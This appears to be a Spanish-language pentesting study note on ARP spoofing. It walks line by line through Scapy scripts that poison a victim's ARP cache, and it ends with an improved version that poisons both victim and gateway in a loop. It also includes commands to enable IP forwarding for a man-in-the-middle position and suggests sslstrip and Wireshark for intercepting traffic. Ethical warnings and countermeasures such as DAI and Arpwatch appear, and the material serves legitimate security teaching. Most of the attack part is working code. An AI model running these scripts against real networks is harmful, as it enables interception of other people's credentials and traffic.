---
tipo: teoria
tags: [ejptv2, el-hacker-legendario, python, pentesting]
actualizado: 2026-05-28
---

# Qué es y cómo Efectuar un Ataque ARP Spoofing con Python

# Versión corta:
---

## 💥 ¿Qué es un ARP Spoofing?

**ARP Spoofing** (o **ARP Poisoning**) es un tipo de ataque en redes locales donde el atacante envía mensajes ARP falsificados a la red, con el objetivo de asociar su dirección MAC con la IP de otro dispositivo (por ejemplo, el router). Así, todo el tráfico destinado al router pasa primero por el atacante, permitiendo **interceptar, modificar o redirigir** los paquetes (MITM - _Man In The Middle_).

---

## 🐍 Explicación del Código Paso a Paso

### 🔹 1. Importación de librerías

```python
from scapy.all import ARP, Ether, sendp, get_if_hwaddr, conf
```

> Se importa lo necesario de **Scapy**, una potente librería de Python para manipular paquetes a nivel de red.

- `ARP`: permite crear paquetes ARP.
    
- `Ether`: crea cabeceras Ethernet.
    
- `sendp`: envía paquetes a nivel de capa 2 (enlace).
    
- `get_if_hwaddr`: obtiene la MAC de una interfaz de red.
    
- `conf`: para acceder a la configuración actual de Scapy.
    

---

### 🔹 2. Definición de IPs de la víctima y el gateway

```python
objectivo = "192.168.1.108"
gateway_ip = "192.168.1.1"
```

> Se definen las IPs:

- `objectivo`: IP del dispositivo víctima (por ejemplo, otro PC en la red).
    
- `gateway_ip`: IP del router o puerta de enlace.
    

---

### 🔹 3. Obtener interfaz de red y MAC del atacante

```python
interface_red = conf.iface
source_mac = get_if_hwaddr(interface_red)
```

> - `conf.iface`: obtiene la interfaz de red por defecto (por ejemplo, `eth0` o `wlan0`).
>     

- `get_if_hwaddr()`: obtiene la dirección MAC asociada a esa interfaz (la del atacante).
    

---

### 🔹 4. Crear un paquete ARP falsificado (spoofed)

```python
arp_respuesta = ARP(
    pdst=objectivo,
    hwdst="ff:ff:ff:ff:ff:ff",
    psrc=gateway_ip,
    hwsrc=source_mac
)
```

> Se construye un paquete ARP **falso**:

- `pdst`: IP destino, la víctima.
    
- `hwdst`: MAC destino (broadcast, para que todos lo escuchen).
    
- `psrc`: IP del router (el atacante suplanta al gateway).
    
- `hwsrc`: MAC del atacante (haciéndose pasar por el gateway).
    

👉 **El truco aquí es que la víctima actualizará su caché ARP**, creyendo que el gateway tiene ahora la MAC del atacante.

---

### 🔹 5. Encapsular en un paquete Ethernet

```python
paquete_arp = Ether(dst="ff:ff:ff:ff:ff:ff") / arp_respuesta
```

> Se encapsula el paquete ARP dentro de un paquete Ethernet con dirección de destino **broadcast**. Esto garantiza que todos los dispositivos en la red vean el paquete.

---

### 🔹 6. Envío continuo del paquete (ataque en loop)

```python
try:
    print(f"Iniciando arp spoofing en {objectivo}")
    sendp(paquete_arp, iface=interface_red, loop=1, inter=0.5)
except KeyboardInterrupt:
    print("Spoofing terminado")
```

> - `sendp(...)`: envía el paquete cada 0.5 segundos de forma indefinida (`loop=1`).
>     

- Esto es necesario porque las cachés ARP se actualizan, por lo que hay que **reforzar continuamente el engaño**.
    

📌 Con `Ctrl+C` se interrumpe el envío.

---

## 🚨 Advertencia ética

Este código **solo debe usarse con fines educativos y en entornos controlados** (como un laboratorio de pruebas). Usarlo en redes que no te pertenecen o sin permiso puede ser ilegal y conlleva consecuencias.

---

## 🛠️ Evolución y uso avanzado

- Se puede extender este ataque para capturar tráfico con herramientas como **Wireshark**.
    
- También es común usarlo junto a **iptables** para redireccionar tráfico o junto a **sslstrip** para romper HTTPS.
    
- Puede automatizarse la restauración del ARP original para limpiar rastros tras el ataque.
    


---

# Versión Extendida:


---

## **1. ¿Qué es ARP Spoofing?**

**ARP Spoofing** (o envenenamiento de la caché ARP) es una técnica de ataque en redes locales (LAN) que permite a un atacante interceptar o manipular el tráfico de red entre dos dispositivos. Se basa en explotar el protocolo **ARP** (Address Resolution Protocol), que se utiliza para mapear direcciones IP a direcciones MAC en una red.

### **Cómo funciona ARP Spoofing:**
1. **ARP en una red normal**:
   - Cuando un dispositivo (como tu computadora) quiere comunicarse con otro en la misma red (como el router o gateway), envía una solicitud ARP broadcast preguntando: "¿Quién tiene esta IP? Dime tu dirección MAC".
   - El dispositivo legítimo con esa IP responde con su dirección MAC.
   - El solicitante guarda esta correspondencia IP-MAC en su tabla ARP para futuras comunicaciones.

2. **En ARP Spoofing**:
   - El atacante envía respuestas ARP falsificadas (sin que se haya solicitado) a uno o ambos dispositivos (generalmente la víctima y el gateway).
   - Estas respuestas engañan a los dispositivos para que asocien la dirección IP de uno con la dirección MAC del atacante.
   - Como resultado, el tráfico de la víctima destinado al gateway (o viceversa) pasa primero por el atacante, quien puede interceptarlo, modificarlo o reenviarlo (ataque **Man-in-the-Middle**, MitM).

3. **Impacto**:
   - Intercepción de datos sensibles (contraseñas, sesiones, etc.).
   - Redirección de tráfico a sitios maliciosos.
   - Denegación de servicio (DoS) al interrumpir la comunicación.

### **Consideraciones éticas**:
- **ARP Spoofing es ilegal** si se realiza sin autorización en redes que no te pertenecen. Solo debe realizarse en entornos controlados, como pruebas de seguridad (pentesting) con permiso explícito.
- Este tutorial es educativo y está destinado a comprender la técnica para fines de seguridad.

---

## **2. Análisis del Código**

El código utiliza la biblioteca **Scapy** en Python para realizar un ataque de ARP Spoofing. Vamos a desglosarlo línea por línea, explicando qué hace cada parte, su propósito y cómo contribuye al ataque.

### **Código Completo:**
```python
from scapy.all import ARP, Ether, sendp, get_if_hwaddr, conf

# Definición de la IP de la víctima y el gateway
objectivo = "192.168.1.108"  # IP del dispositivo objetivo (víctima)
gateway_ip = "192.168.1.1"   # IP del router/gateway

# Configuración de la interfaz de red
interface_red = conf.iface   # Obtiene la interfaz de red predeterminada (ej. eth0, wlan0)
source_mac = get_if_hwaddr(interface_red)  # Obtiene la dirección MAC de la interfaz

# Creación del paquete ARP falso
arp_respuesta = ARP(
    pdst=objectivo,          # IP de destino (la víctima)
    hwdst="ff:ff:ff:ff:ff:ff",  # MAC de destino (broadcast, para que todos lo reciban)
    psrc=gateway_ip,         # IP fuente (fingimos ser el gateway)
    hwsrc=source_mac         # MAC fuente (la del atacante)
)

# Creación del paquete Ethernet que contiene el ARP
paquete_arp = Ether(dst="ff:ff:ff:ff:ff:ff") / arp_respuesta

# Envío del paquete en un bucle hasta que se interrumpa
try:
    print(f"Iniciando arp spoofing en {objectivo}")
    sendp(paquete_arp, iface=interface_red, loop=1, inter=0.5)  # Envía paquetes cada 0.5 segundos
except KeyboardInterrupt:
    print("Spoofing terminado")
```

---

### **Paso a Paso del Código**

#### **1. Importación de Módulos**
```python
from scapy.all import ARP, Ether, sendp, get_if_hwaddr, conf
```
- **Scapy**: Es una biblioteca de Python para manipulación y envío de paquetes de red. Permite crear, enviar y capturar paquetes a nivel de enlace y red.
- **Módulos importados**:
  - `ARP`: Clase para crear paquetes ARP.
  - `Ether`: Clase para crear paquetes Ethernet (capa 2).
  - `sendp`: Función para enviar paquetes en la capa 2 (enlace).
  - `get_if_hwaddr`: Función para obtener la dirección MAC de una interfaz.
  - `conf`: Objeto de configuración de Scapy que contiene información como la interfaz de red predeterminada.

#### **2. Definición de Variables**
```python
objectivo = "192.168.1.108"
gateway_ip = "192.168.1.1"
```
- **`objectivo`**: La dirección IP del dispositivo que será envenenado (la víctima). En este caso, `192.168.1.108`.
- **`gateway_ip`**: La dirección IP del router o gateway de la red, que es el dispositivo al que la víctima envía su tráfico para salir a Internet (`192.168.1.1` es una IP común para routers).

#### **3. Configuración de la Interfaz de Red**
```python
interface_red = conf.iface
source_mac = get_if_hwaddr(interface_red)
```
- **`interface_red = conf.iface`**: Obtiene la interfaz de red predeterminada del sistema (por ejemplo, `eth0` para Ethernet o `wlan0` para Wi-Fi). Scapy usa esta interfaz para enviar los paquetes.
- **`source_mac = get_if_hwaddr(interface_red)`**: Obtiene la dirección MAC de la interfaz de red del atacante. Esta será usada como la dirección MAC falsa en el paquete ARP.

#### **4. Creación del Paquete ARP**
```python
arp_respuesta = ARP(
    pdst=objectivo,
    hwdst="ff:ff:ff:ff:ff:ff",
    psrc=gateway_ip,
    hwsrc=source_mac
)
```
- Aquí se crea un paquete ARP falso que simula ser una respuesta del gateway.
- **Parámetros del paquete ARP**:
  - **`pdst=objectivo`**: La IP de destino del paquete ARP, es decir, la IP de la víctima (`192.168.1.108`). Esto indica que el paquete está dirigido a la víctima.
  - **`hwdst="ff:ff:ff:ff:ff:ff"`**: La dirección MAC de destino. Se usa una dirección broadcast (`ff:ff:ff:ff:ff:ff`) para que todos los dispositivos en la red reciban el paquete. Esto es típico en solicitudes ARP, pero aquí se usa para maximizar el impacto.
  - **`psrc=gateway_ip`**: La IP fuente, que se falsifica para que parezca que el paquete viene del gateway (`192.168.1.1`). Esto engaña a la víctima para que crea que el gateway está enviando la respuesta.
  - **`hwsrc=source_mac`**: La MAC fuente, que es la del atacante. Esto hace que la víctima asocie la IP del gateway (`192.168.1.1`) con la MAC del atacante.

- **Efecto**: Cuando la víctima reciba este paquete, actualizará su tabla ARP para asociar `192.168.1.1` (gateway) con la MAC del atacante, enviando todo el tráfico destinado al gateway al atacante.

#### **5. Creación del Paquete Ethernet**
```python
paquete_arp = Ether(dst="ff:ff:ff:ff:ff:ff") / arp_respuesta
```
- Los paquetes ARP viajan dentro de tramas Ethernet. Aquí se crea una trama Ethernet que encapsula el paquete ARP.
- **`Ether(dst="ff:ff:ff:ff:ff:ff")`**: Crea una trama Ethernet con una dirección MAC de destino broadcast (`ff:ff:ff:ff:ff:ff`). Esto asegura que el paquete llegue a todos los dispositivos en la red.
- **`/ arp_respuesta`**: Combina la trama Ethernet con el paquete ARP creado anteriormente. En Scapy, el operador `/` se usa para apilar capas de protocolo.

#### **6. Envío del Paquete**
```python
try:
    print(f"Iniciando arp spoofing en {objectivo}")
    sendp(paquete_arp, iface=interface_red, loop=1, inter=0.5)
except KeyboardInterrupt:
    print("Spoofing terminado")
```
- **`sendp`**: Envía el paquete en la capa 2 (enlace) a través de la interfaz especificada (`interface_red`).
- **Parámetros**:
  - **`paquete_arp`**: El paquete Ethernet/ARP que se envía.
  - **`iface=interface_red`**: La interfaz de red desde la cual se envía el paquete.
  - **`loop=1`**: Indica que el paquete se enviará en un bucle infinito hasta que se interrumpa manualmente.
  - **`inter=0.5`**: Establece un intervalo de 0.5 segundos entre cada envío. Esto es importante porque las tablas ARP de los dispositivos pueden actualizarse periódicamente, y enviar paquetes continuamente asegura que la tabla de la víctima permanezca envenenada.
- **`try/except`**: Captura la interrupción del teclado (`Ctrl+C`) para detener el ataque de manera controlada, mostrando un mensaje de finalización.

---

### **3. ¿Qué Sucede Cuando Ejecutas el Código?**

1. **Inicio del Ataque**:
   - El código obtiene la interfaz de red y la dirección MAC del atacante.
   - Crea un paquete ARP que finge ser una respuesta del gateway (`192.168.1.1`), asociando su IP con la MAC del atacante.
   - Este paquete se envía repetidamente (cada 0.5 segundos) a la víctima (`192.168.1.108`).

2. **Efecto en la Víctima**:
   - La víctima recibe el paquete ARP y actualiza su tabla ARP, asociando la IP del gateway (`192.168.1.1`) con la MAC del atacante.
   - Todo el tráfico que la víctima envíe al gateway (por ejemplo, para navegar por Internet) será redirigido al atacante.

3. **Man-in-the-Middle**:
   - El atacante ahora está en el medio de la comunicación entre la víctima y el gateway.
   - Para completar el ataque MitM, el atacante también debe envenenar la tabla ARP del gateway (asociando la IP de la víctima con la MAC del atacante). Esto no está implementado en el código proporcionado, pero se explicará más adelante.

4. **Intercepción de Tráfico**:
   - El atacante puede usar herramientas como **Wireshark** o scripts adicionales para capturar el tráfico que pasa por su máquina.
   - Si el tráfico no está cifrado (por ejemplo, HTTP en lugar de HTTPS), el atacante puede ver datos sensibles.

5. **Finalización**:
   - Cuando el usuario presiona `Ctrl+C`, el envío de paquetes se detiene. Sin embargo, la tabla ARP de la víctima permanecerá envenenada hasta que reciba una actualización legítima del gateway o se reinicie.

---

### **4. Limitaciones y Mejoras del Código**

#### **Limitaciones**:
1. **Unidireccional**:
   - El código solo envenena la tabla ARP de la víctima, redirigiendo el tráfico de la víctima al atacante. Sin embargo, el tráfico del gateway a la víctima no está redirigido, por lo que no es un ataque MitM completo.
   - Para un MitM completo, también debes envenenar la tabla ARP del gateway, asociando la IP de la víctima con la MAC del atacante.

2. **Falta de Reenvío de Paquetes**:
   - Una vez que el tráfico de la víctima llega al atacante, este debe reenviar los paquetes al gateway (y viceversa) para que la comunicación no se interrumpa y la víctima no sospeche. Esto requiere habilitar el **IP forwarding** en el sistema del atacante.

3. **No Restaura la Tabla ARP**:
   - Cuando el ataque termina, la tabla ARP de la víctima permanece envenenada. Deberías enviar paquetes ARP legítimos para restaurar las asociaciones correctas.

#### **Mejoras Posibles**:
1. **Envenenar Ambos Dispositivos**:
   - Modifica el código para enviar paquetes ARP tanto a la víctima como al gateway. Por ejemplo:
     ```python
     arp_respuesta_victima = ARP(pdst=objectivo, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=source_mac)
     arp_respuesta_gateway = ARP(pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=objectivo, hwsrc=source_mac)
     ```

2. **Habilitar IP Forwarding**:
   - En Linux, habilita el reenvío de paquetes con:
     ```bash
     echo 1 > /proc/sys/net/ipv4/ip_forward
     ```
   - Esto asegura que los paquetes recibidos por el atacante se reenvíen al destino correcto, manteniendo la comunicación fluida.

3. **Restaurar Tablas ARP**:
   - Al finalizar el ataque, envía paquetes ARP legítimos para restaurar las tablas. Esto requiere conocer las direcciones MAC reales del gateway y la víctima.

4. **Obtener MAC de Destino**:
   - En lugar de usar `hwdst="ff:ff:ff:ff:ff:ff"`, obtén la MAC real de la víctima y el gateway para enviar paquetes dirigidos específicamente, lo que es más eficiente.

---

### **5. Ej: Mejorado**

Aquí hay una versión mejorada que envenena tanto la víctima como el gateway y restaura las tablas ARP al finalizar:

```python
from scapy.all import ARP, Ether, sendp, get_if_hwaddr, conf, srp
import time

def get_mac(ip):
    """Obtiene la dirección MAC de una IP."""
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    respuesta = srp(arp_request, timeout=2, verbose=False)[0]
    return respuesta[0][1].hwsrc if respuesta else None

def arp_spoof(target_ip, target_mac, spoof_ip, iface):
    """Envía paquetes ARP falsos."""
    arp_respuesta = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=get_if_hwaddr(iface))
    paquete = Ether(dst=target_mac) / arp_respuesta
    sendp(paquete, iface=iface, verbose=False)

def restore_arp(target_ip, target_mac, source_ip, source_mac, iface):
    """Restaura la tabla ARP enviando paquetes legítimos."""
    arp_respuesta = ARP(pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    paquete = Ether(dst=target_mac) / arp_respuesta
    sendp(paquete, iface=iface, count=5, verbose=False)

# Configuración
objectivo = "192.168.1.108"
gateway_ip = "192.168.1.1"
interface_red = conf.iface

# Obtener MACs
target_mac = get_mac(objectivo)
gateway_mac = get_mac(gateway_ip)

if not target_mac or not gateway_mac:
    print("No se pudo obtener la MAC de la víctima o el gateway.")
    exit()

try:
    print(f"Iniciando ARP Spoofing en {objectivo}...")
    while True:
        # Envenenar víctima (fingir ser el gateway)
        arp_spoof(objectivo, target_mac, gateway_ip, interface_red)
        # Envenenar gateway (fingir ser la víctima)
        arp_spoof(gateway_ip, gateway_mac, objectivo, interface_red)
        time.sleep(0.5)
except KeyboardInterrupt:
    print("Restaurando tablas ARP...")
    # Restaurar tablas ARP
    restore_arp(objectivo, target_mac, gateway_ip, gateway_mac, interface_red)
    restore_arp(gateway_ip, gateway_mac, objectivo, target_mac, interface_red)
    print("Spoofing terminado.")
```

---

### **6. Uso y Precauciones**

#### **Cómo Usar el Código**:
1. **Instalar Scapy**:
   ```bash
   pip install scapy
   ```
2. **Ejecutar como Root**:
   - En Linux, ejecuta el script con privilegios de superusuario porque Scapy necesita acceso a la interfaz de red:
     ```bash
     sudo python3 arp_spoof.py
     ```
3. **Habilitar IP Forwarding** (opcional):
   - Si deseas que el tráfico fluya normalmente:
     ```bash
     echo 1 > /proc/sys/net/ipv4/ip_forward
     ```
4. **Capturar Tráfico**:
   - Usa herramientas como Wireshark o `tcpdump` para capturar el tráfico redirigido.

#### **Precauciones**:
- **Permiso**: Solo realiza ARP Spoofing en redes donde tengas autorización explícita.
- **Impacto en la Red**: El ataque puede causar interrupciones si no se reenvía el tráfico correctamente.
- **Detección**: Muchas redes modernas tienen mecanismos de protección contra ARP Spoofing, como **ARP inspection** en switches gestionados o software de seguridad.
- **Legalidad**: Realizar este ataque sin permiso es ilegal y puede tener consecuencias legales graves.

---

### **7. Evolución y Contexto**

#### **Evolución de ARP Spoofing**:
- **Origen**: Surgió en los años 90 como una técnica para explotar la falta de autenticación en el protocolo ARP.
- **Popularidad**: Fue ampliamente utilizado en herramientas como **Cain & Abel**, **Ettercap** y **arpspoof** antes de que Scapy simplificara la creación de scripts personalizados.
- **Contramedidas Modernas**:
  - **Switches gestionados**: Implementan inspección ARP dinámica (DAI) para verificar la validez de los paquetes ARP.
  - **Protocolos seguros**: El uso de HTTPS, VPNs y cifrado dificulta la interceptación de datos sensibles.
  - **Herramientas de detección**: Software como **Arpwatch** monitorea cambios sospechosos en las tablas ARP.

#### **Uso en Seguridad**:
- **Pentesting**: Los profesionales de seguridad usan ARP Spoofing para probar la robustez de una red frente a ataques MitM.
- **Educación**: Enseña cómo funcionan los protocolos de red y la importancia de la seguridad en la capa de enlace.

---

### **8. Conclusión**

El código es una implementación básica de ARP Spoofing que envenena la tabla ARP de una víctima para redirigir su tráfico al atacante. Aunque funcional, tiene limitaciones (como ser unidireccional y no restaurar las tablas ARP). La versión mejorada aborda estas limitaciones al envenenar ambos dispositivos, restaurar tablas ARP y obtener direcciones MAC específicas.

**ARP Spoofing** es una técnica poderosa para entender las vulnerabilidades de las redes locales, pero debe usarse con responsabilidad y solo en entornos autorizados. Combinado con herramientas de captura de tráfico y un buen entendimiento de los protocolos de red, puede ser una herramienta valiosa para pruebas de seguridad, pero siempre bajo un marco ético y legal.

---

## Navegación

- ⬆️ Carpeta: [[_15- Scapy (En desarrollo)|15- Scapy (En desarrollo)]]
- ⬅️ Anterior: [[6- Herramienta para Encontrar Equipos en mi Red con Scapy]]
